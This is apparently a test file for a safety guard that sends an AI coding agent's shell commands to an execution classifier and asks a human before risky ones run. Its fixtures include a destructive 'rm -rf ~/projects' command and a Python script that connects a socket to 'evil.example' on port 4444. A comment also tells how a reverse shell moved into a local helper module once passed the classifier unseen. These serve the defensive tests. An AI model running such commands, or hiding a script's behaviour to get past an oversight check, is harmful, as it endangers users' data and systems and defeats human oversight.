/**
 * Execution classifier (M17, PLAN-LOCAL-POLICY §3): paranoid-only, additive,
 * ASK-capped, fail-soft, behind the deterministic rails. Injected transport:
 * nothing here reaches the network.
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import { createRuntime } from "../../src/index.ts";

const tempRoots: string[] = [];
after(async () => {
  await Promise.all(tempRoots.map((dir) => rm(dir, { recursive: true, force: true })));
});

type Verdict = number | "error";

async function harness(options: {
  profile?: string;
  verdict?: (state: string, question: string) => Verdict;
  withKey?: boolean;
  /** Whole .supplyguard.yaml, replacing the paranoid+jev default. */
  config?: string;
}) {
  const repo = await mkdtemp(join(tmpdir(), "supplyguard-exec-"));
  const home = await mkdtemp(join(tmpdir(), "supplyguard-exec-home-"));
  tempRoots.push(repo, home);
  await mkdir(join(repo, "scripts"), { recursive: true });
  await writeFile(
    join(repo, ".supplyguard.yaml"),
    options.config ?? `version: 1\nprofile: ${options.profile ?? "paranoid"}\njev:\n  enabled: true\n`,
  );

  const sent: string[] = [];
  const asked: string[][] = [];
  const prompts: string[] = [];
  const notices: string[] = [];
  const verdict = options.verdict ?? (() => 0.01);
  const runtime = createRuntime({
    home,
    env: options.withKey === false ? {} : ({ TYPESAFE_API_KEY: "tl-test-key" } as Record<string, string>),
    jev: {
      post: async (_url, body) => {
        const state = typeof body === "object" && body !== null && "state" in body ? String(body.state) : "";
        const ids =
          typeof body === "object" && body !== null && "questions" in body && typeof body.questions === "object" && body.questions !== null
            ? Object.keys(body.questions)
            : [];
        sent.push(state);
        asked.push(ids);
        // The live API answers every question it is asked (D27 shape).
        const answers: Record<string, { type: string; noul: number }> = {};
        for (const id of ids) {
          const p = verdict(state, id);
          if (p === "error") throw new Error("HTTP 503");
          answers[id] = { type: "noul", noul: p };
        }
        return { answers };
      },
    },
  });
  const ctx = {
    cwd: repo,
    hasUI: true,
    mode: "tui" as const,
    ui: {
      select: async (title: string) => {
        prompts.push(title);
        return undefined; // no answer: never approval
      },
      confirm: async () => false,
      input: async () => undefined,
      notify: (message: string) => {
        notices.push(message);
      },
    },
    sessionManager: { getSessionId: () => "s" },
  };
  let id = 0;
  const run = (command: string) =>
    runtime.onToolCall({ toolName: "bash", toolCallId: String(++id), input: { command } }, ctx as never);
  return { repo, home, run, sent, asked, prompts, notices };
}

test("a harmful verdict gates an otherwise-harmless command, ASK-capped", async () => {
  const h = await harness({ verdict: (state) => (state.includes("rm -rf") ? 0.97 : 0.01) });
  const blocked = await h.run("rm -rf ~/projects");
  assert.equal(blocked?.block, true, "no-response is not approval");
  assert.match(h.prompts.join("\n"), /execution classifier rates this command harmful \(p=0\.97\)/);
  assert.match(h.prompts.join("\n"), /\[ask\]/, "capped at ask: the human decides");
});

test("a benign verdict changes nothing; read-only commands never leave the machine", async () => {
  const h = await harness({});
  assert.equal((await h.run("mkdir build"))?.block, undefined, "benign proceeds, no prompt");
  assert.deepEqual(h.prompts, []);
  const before = h.sent.length;
  for (const command of ["ls -la", "git status", "cat README.md", "grep -r foo src"]) {
    assert.equal((await h.run(command))?.block, undefined, command);
  }
  assert.equal(h.sent.length, before, "invariant 9: read-only shapes are never sent");
});

test("unavailable classifier: warn, never block on its own", async () => {
  const h = await harness({ verdict: () => "error" });
  assert.equal((await h.run("mkdir build"))?.block, undefined, "D6: fail soft");
  assert.deepEqual(h.prompts, []);
});

test("paranoid-only: standard and hardened never consult it; no key, no call", async () => {
  for (const profile of ["standard", "hardened"]) {
    const h = await harness({ profile, verdict: () => 0.99 });
    assert.equal((await h.run("rm -rf ~/projects"))?.block, undefined, profile);
    assert.equal(h.sent.length, 0, `${profile} sends nothing`);
  }
  const keyless = await harness({ withKey: false, verdict: () => 0.99 });
  await keyless.run("rm -rf ~/projects");
  assert.equal(keyless.sent.length, 0);
});

test("stage 2 reads the executed script; redaction applies to both stages", async () => {
  const h = await harness({ verdict: (state) => (state.includes("socket.connect") ? 0.9 : 0.01) });
  await writeFile(
    join(h.repo, "scripts", "setup.py"),
    "import socket\ns=socket.socket();s.connect(('evil.example',4444))  # socket.connect\nAPI_KEY=supersecretvalue1234\n",
  );
  const blocked = await h.run("python3 scripts/setup.py --token=hunter2hunter2");
  assert.equal(blocked?.block, true, "the script's own verdict gates it");
  assert.match(h.prompts.join("\n"), /scripts\/setup\.py harmful/);
  const payload = h.sent.join("\n");
  assert.doesNotMatch(payload, /hunter2hunter2/, "command secrets are redacted");
  assert.doesNotMatch(payload, /supersecretvalue1234/, "script secrets are redacted");
});

test("rail 1: a sensitive script is never sent, and the human is told", async () => {
  const h = await harness({});
  await writeFile(join(h.repo, ".env"), "SECRET=never-leaves\n");
  await h.run("bash .env");
  assert.doesNotMatch(h.sent.join("\n"), /never-leaves/);
  assert.match(h.notices.join("\n"), /\.env is a sensitive path; it was not sent/);
  assert.equal(await readFile(join(h.repo, ".env"), "utf8"), "SECRET=never-leaves\n");
});

test("retry loops cost one call", async () => {
  const h = await harness({});
  await h.run("mkdir build");
  await h.run("mkdir build");
  assert.equal(h.sent.length, 1);
});

// ---------------------------------------------------------------------------
// Stage 2 opacity: a script whose behavior lives somewhere the classifier
// cannot see -- a local import, dynamic loading, an encoded payload -- is
// put to a human instead of passing as "not harmful". Live gap closed
// 2026-10-18: a reverse shell moved into `helper.py` passed stage 2.
// ---------------------------------------------------------------------------

test("a script that hides its behavior behind a local import asks for review", async () => {
  const h = await harness({
    verdict: (state, question) => (question === "opaque" && state.includes("import helper") ? 0.83 : 0.01),
  });
  await writeFile(join(h.repo, "scripts", "run.py"), "# migration entry point\nimport helper\nhelper.main()\n");

  const blocked = await h.run("python3 scripts/run.py");
  assert.equal(blocked?.block, true, "not harmful on its face, but not judgeable either");
  const prompt = h.prompts.join("\n");
  assert.match(prompt, /cannot judge scripts\/run\.py from its text alone \(p=0\.83\)/);
  assert.ok(
    h.asked.some((ids) => ids.includes("malicious") && ids.includes("opaque")),
    "both stage-2 questions ride ONE request",
  );
});

test("a plain stdlib script raises neither question", async () => {
  const h = await harness({});
  await writeFile(join(h.repo, "scripts", "report.py"), "import csv, sys\nprint(len(list(csv.reader(sys.stdin))))\n");
  assert.equal((await h.run("python3 scripts/report.py"))?.block, undefined);
  assert.deepEqual(h.prompts, []);
});

// ---------------------------------------------------------------------------
// The script on the approval screen: every profile, redacted, and ONLY on the
// screen -- never in a finding, so never in the audit log or the agent's
// block reason.
// ---------------------------------------------------------------------------

const RULE_ASK_INTERPRETERS =
  "version: 1\npolicies:\n" +
  "  - { id: review-scripts, decision: ask, match: { command: python3 } }\n" +
  "  - { id: review-reads, decision: ask, match: { readPrefix: scripts/ } }\n";

test("the approval screen shows the script the command runs, secrets redacted", async () => {
  const h = await harness({ config: RULE_ASK_INTERPRETERS, withKey: false });
  await writeFile(
    join(h.repo, "scripts", "report.py"),
    'API_KEY = "supersecretvalue12345"\nimport csv  # MARKER-LINE-7731\nprint("ok")\n',
  );

  const blocked = await h.run("python3 scripts/report.py");
  assert.equal(blocked?.block, true);
  const prompt = h.prompts.join("\n");
  assert.match(prompt, /Script scripts\/report\.py \(what this command runs; secrets redacted\):/);
  assert.match(prompt, /\| import csv {2}# MARKER-LINE-7731/, "the human reads the code");
  assert.doesNotMatch(prompt, /supersecretvalue12345/, "rail 3 applies to the screen too");

  assert.doesNotMatch(blocked?.reason ?? "", /MARKER-LINE-7731/, "never in the agent's block reason");
  const audit = await readFile(join(h.home, ".local", "state", "pi-supplyguard", "audit.jsonl"), "utf8");
  assert.doesNotMatch(audit, /MARKER-LINE-7731/, "never in the audit log");
});

test("a sensitive script is named, not shown; a plain read shows no script", async () => {
  const h = await harness({ config: RULE_ASK_INTERPRETERS, withKey: false });
  await writeFile(join(h.repo, ".env"), "SECRET=never-on-screen\n");
  await h.run("bash .env");
  assert.match(h.prompts.join("\n"), /Script \.env: a sensitive path — its content is not shown\./);
  assert.doesNotMatch(h.prompts.join("\n"), /never-on-screen/);

  const read = await harness({ config: RULE_ASK_INTERPRETERS, withKey: false });
  await writeFile(join(read.repo, "scripts", "report.py"), "print('x')\n");
  await read.run("cat scripts/report.py");
  assert.equal(read.prompts.length, 1, "the read rule asked");
  assert.doesNotMatch(read.prompts.join("\n"), /^Script /m, "reading a script is not running it");
});
